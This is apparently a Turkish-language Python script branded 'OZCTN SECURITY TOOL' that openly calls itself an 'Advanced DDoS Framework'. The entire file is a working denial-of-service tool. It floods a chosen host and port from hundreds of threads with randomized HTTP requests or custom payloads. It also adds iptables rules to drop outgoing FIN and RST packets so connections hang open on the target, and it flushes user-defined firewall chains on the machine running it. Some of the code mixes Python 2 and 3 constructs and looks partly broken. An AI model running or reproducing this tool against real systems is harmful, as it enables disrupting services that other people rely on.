#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
from time import sleep
from threading import Thread, active_count
from os import system, geteuid
import random
import string
import signal
import ssl
import argparse
import sys
import time

#     ██████╗ ███████╗ ██████╗████████╗███╗   ██╗
#    ██╔═══██╗╚══███╔╝██╔════╝╚══██╔══╝████╗  ██║
#    ██║   ██║  ███╔╝ ██║        ██║   ██╔██╗ ██║
#    ██║   ██║ ███╔╝  ██║        ██║   ██║╚██╗██║
#    ╚██████╔╝███████╗╚██████╗   ██║   ██║ ╚████║
#     ╚═════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝
#                                                
# 🚀 OZCTN Developer - Advanced Security Tool

örnek_kullanım = ''' 
╔════════════════════════════════════════════════╗
║                 💡 İPUÇLARI                   ║
╠════════════════════════════════════════════════╣
║ • Hedef sayfa boyutu 1500+ bayt olmalıdır     ║
║ • Sadece test sistemlerinde kullanın          ║
║ • Root yetkisi gereklidir                     ║
╚════════════════════════════════════════════════╝

╔════════════════════════════════════════════════╗
║              📚 ÖRNEK KULLANIMLAR             ║
╠════════════════════════════════════════════════╣
║ python %s example.com -p 80 -http            ║
║ python %s example.com -p 443 -ssl -http      ║
║ python %s example.com -p 21 -yük 68656c6c6f  ║
║ python %s example.com -p 22 -t 500           ║
╚════════════════════════════════════════════════╝
''' % (sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0])

ayrıştırıcı = argparse.ArgumentParser(
    description='╔════════════════════════════════════════════════╗\n║           🚀 OZCTN SECURITY TOOL v2.0           ║\n╚════════════════════════════════════════════════╝',
    epilog=örnek_kullanım, 
    formatter_class=argparse.RawTextHelpFormatter
)

ayrıştırıcı._action_groups.pop()
gerekli = ayrıştırıcı.add_argument_group('╔════════════════════════════════════════════════╗\n║                 🔧 GEREKLİ AYARLAR                ║\n╚════════════════════════════════════════════════╝')
opsiyonel = ayrıştırıcı.add_argument_group('╔════════════════════════════════════════════════╗\n║                🎛️  OPSİYONEL AYARLAR              ║\n╚════════════════════════════════════════════════╝')

gerekli.add_argument('hedef', help='🎯 Saldırı yapılacak hedef adres (örn: example.com)')
gerekli.add_argument('-p', dest='port', help='🔌 Hedef port numarası (örn: 80, 443)', type=int, required=True)

opsiyonel.add_argument('-t', dest='THREADS', type=int, default=300, help='🧵 Eşzamanlı thread sayısı (varsayılan: 300)')
opsiyonel.add_argument('-ssl', action='store_true', help='🔒 SSL/TLS şifreleme kullan')
opsiyonel.add_argument('-http', action='store_true', help='🌐 HTTP başlıkları ekle')
opsiyonel.add_argument('-yük', dest='payload', help='📦 Özel hex formatında yük (örn: 48656c6c6f)')

print("\n" + "╔════════════════════════════════════════════════╗")
print("║           🚀 OZCTN SECURITY TOOL v2.0           ║")
print("║           🔥 Advanced DDoS Framework           ║")
print("╚════════════════════════════════════════════════╝\n")

args = ayrıştırıcı.parse_args()

# 📊 İstatistik değişkenleri
bağlantılar = 0
düşürülen = 0
yükler = 0
port = args.port

# 🔗 Hedef URL'yi temizle
hedef = args.hedef.replace('http://','').replace('https://','')

# 📍 Yol bilgisini ayır
if '/' in hedef and args.http:
    yol = hedef[hedef.find('/'):]
    hedef = hedef[:hedef.find('/')]
else:
    yol = '/'

# 📦 Yük işleme
try:
    if args.payload:
        yük = args.payload.decode('hex')
    else:
        yük = ''
except:
    print('╔════════════════════════════════════════════════╗')
    print('║                    ❌ HATA                     ║')
    print('╠════════════════════════════════════════════════╣')
    print('║ Yük hex formatında olmalıdır!                 ║')
    print('║ Örnek: 48656c6c6f (Hello)                     ║')
    print('╚════════════════════════════════════════════════╝')
    sys.exit()

# ⚠️ Root kontrolü
if geteuid() != 0:
    print('╔════════════════════════════════════════════════╗')
    print('║                    ⚠️ UYARI                    ║')
    print('╠════════════════════════════════════════════════╣')
    print('║ Bu aracı root yetkisiyle çalıştırmanız         ║')
    print('║ gerekiyor!                                     ║')
    print('║                                                ║')
    print('║ sudo python %s                          ║' % sys.argv[0])
    print('╚════════════════════════════════════════════════╝')
    sys.exit()

# 🛑 CTRL+C yakalama
durdur = False
def sinyal_yakalayıcı(sinyal, kare):
    global durdur
    print("\n╔════════════════════════════════════════════════╗")
    print("║                  🛑 DURDURULUYOR               ║")
    print("╚════════════════════════════════════════════════╝")
    durdur = True

signal.signal(signal.SIGINT, sinyal_yakalayıcı)
system('iptables -X > /dev/null 2>&1')

# 🔄 Rastgele string üreteci
def rastgele_string(boyut=random.randint(3, 8), karakterler=string.ascii_letters + string.digits):
    return ''.join(random.choice(karakterler) for _ in range(boyut))

# 🌐 HTTP yükü oluşturma
def http_yükü_oluştur():
    yük = 'GET %s?%s=%s HTTP/1.1\r\n' % (yol, rastgele_string(), rastgele_string())
    yük += 'Host: %s\r\n' % hedef
    yük += 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) OZCTN-Security\r\n'
    yük += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
    yük += 'Accept-Language: tr-TR,tr;q=0.9,en;q=0.8\r\n'
    yük += 'Cache-Control: no-cache\r\n'
    yük += 'Connection: keep-alive\r\n\r\n'
    return yük

# 📊 İstatistik kutusu gösterme
def istatistik_göster():
    system('clear')
    print("╔════════════════════════════════════════════════╗")
    print("║           🚀 OZCTN SECURITY TOOL v2.0         ║")
    print("║           🔥 ACTIVE PENETRATION TEST          ║")
    print("╠════════════════════════════════════════════════╣")
    print("║  🎯 HEDEF: %-33s ║" % (hedef[:33] + '...' if len(hedef) > 33 else hedef))
    print("║  📍 PORT: %-34s ║" % port)
    print("║  🔧 THREAD: %-32s ║" % args.THREADS)
    print("╠════════════════════════════════════════════════╣")
    print("║  🔥 AKTİF BAĞLANTILAR: %-23s ║" % bağlantılar)
    print("║  📦 GÖNDERİLEN YÜKLER: %-22s ║" % yükler)
    print("║  ❌ DÜŞÜRÜLEN PAKETLER: %-22s ║" % düşürülen)
    print("║  ⚡ AKTİF THREAD'LER: %-24s ║" % (active_count()-1))
    print("╠════════════════════════════════════════════════╣")
    print("║  🕒 SÜRE: %-34s ║" % time.strftime("%H:%M:%S"))
    print("║  📡 DURUM: %-32s ║" % ("AKTİF" if not durdur else "DURDURULDU"))
    print("╠════════════════════════════════════════════════╣")
    print("║  💀 CTRL+C - Saldırıyı Durdur                 ║")
    print("╚════════════════════════════════════════════════╝")

# ⚡ Saldırı fonksiyonu
def saldırı(hedef_ip, yük):
    global bağlantılar, düşürülen, yükler
    thread_id = random.randint(1000, 9999)
    
    while not durdur:
        try:
            soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soket.settimeout(2)
            
            soket.connect((hedef_ip, port))
            bağlantılar += 1
            
            if args.ssl:
                soket = ssl.wrap_socket(soket, cert_reqs=ssl.CERT_NONE)
            
            if args.http and not args.payload:
                yük = http_yükü_oluştur()
            
            soket.send(yük)
            yükler += 1
            soket.close()
            
        except Exception as e:
            düşürülen += 1

if __name__ == '__main__':
    try:
        hedef_ip = socket.gethostbyname(hedef)
        
        print("╔════════════════════════════════════════════════╗")
        print("║              ⚡ SİSTEM HAZIRLIĞI              ║")
        print("╠════════════════════════════════════════════════╣")
        print("║  🔍 Hedef IP: %-30s ║" % hedef_ip)
        print("║  🔧 Port: %-34s ║" % port)
        print("║  🧵 Thread: %-32s ║" % args.THREADS)
        print("║  🔒 SSL: %-35s ║" % ("AKTİF" if args.ssl else "PASİF"))
        print("║  🌐 HTTP: %-34s ║" % ("AKTİF" if args.http else "PASİF"))
        print("╚════════════════════════════════════════════════╝")
        
        print("\n╔════════════════════════════════════════════════╗")
        print("║              🛡️  GÜVENLİK ÖNLEMLERİ           ║")
        print("╠════════════════════════════════════════════════╣")
        print("║  • iptables kuralları uygulanıyor...         ║")
        print("╚════════════════════════════════════════════════╝")
        
        # 🛡️ İptables kuralları
        system(f'iptables -A OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags FIN FIN -j DROP 2>/dev/null')
        system(f'iptables -A OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags RST RST -j DROP 2>/dev/null')
        
        print("╔════════════════════════════════════════════════╗")
        print("║              🚀 SALDIRI BAŞLATILIYOR         ║")
        print("╠════════════════════════════════════════════════╣")
        print("║  Thread'ler oluşturuluyor...                 ║")
        print("╚════════════════════════════════════════════════╝")
        sleep(2)
        
        # 🚀 Thread'leri başlat
        thread_listesi = []
        for i in range(args.THREADS):
            thread = Thread(target=saldırı, args=(hedef_ip, yük))
            thread_listesi.append(thread)
            thread.daemon = True
            thread.start()
        
        # 📊 İstatistik gösterimi
        başlangıç_zamanı = time.time()
        while not durdur:
            if active_count() == 1:
                break
                
            istatistik_göster()
            sleep(0.3)
            
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print("╔════════════════════════════════════════════════╗")
        print("║                    ❌ HATA                     ║")
        print("╠════════════════════════════════════════════════╣")
        print("║ %-42s ║" % str(e))
        print("╚════════════════════════════════════════════════╝")
    finally:
        # 🧹 Temizlik işlemleri
        durdur = True
        sleep(1)
        
        system(f'iptables -D OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags FIN FIN -j DROP 2>/dev/null')
        system(f'iptables -D OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags RST RST -j DROP 2>/dev/null')
        
        toplam_süre = time.time() - başlangıç_zamanı
        print("\n╔════════════════════════════════════════════════╗")
        print("║                📊 SALDIRI SONU                ║")
        print("╠════════════════════════════════════════════════╣")
        print("║  ✅ Toplam Bağlantı: %-25s ║" % bağlantılar)
        print("║  📦 Toplam Yük: %-28s ║" % yükler)
        print("║  ❌ Toplam Düşürülen: %-24s ║" % düşürülen)
        print("║  ⏱️  Toplam Süre: %-26s ║" % f"{toplam_süre:.1f}s")
        print("║  ⚡ Ortalama RPS: %-25s ║" % f"{(bağlantılar/toplam_süre):.1f}/s")
        print("╠════════════════════════════════════════════════╣")
        print("║           🎉 OZCTN TOOL KAPATILDI            ║")
        print("╚════════════════════════════════════════════════╝")
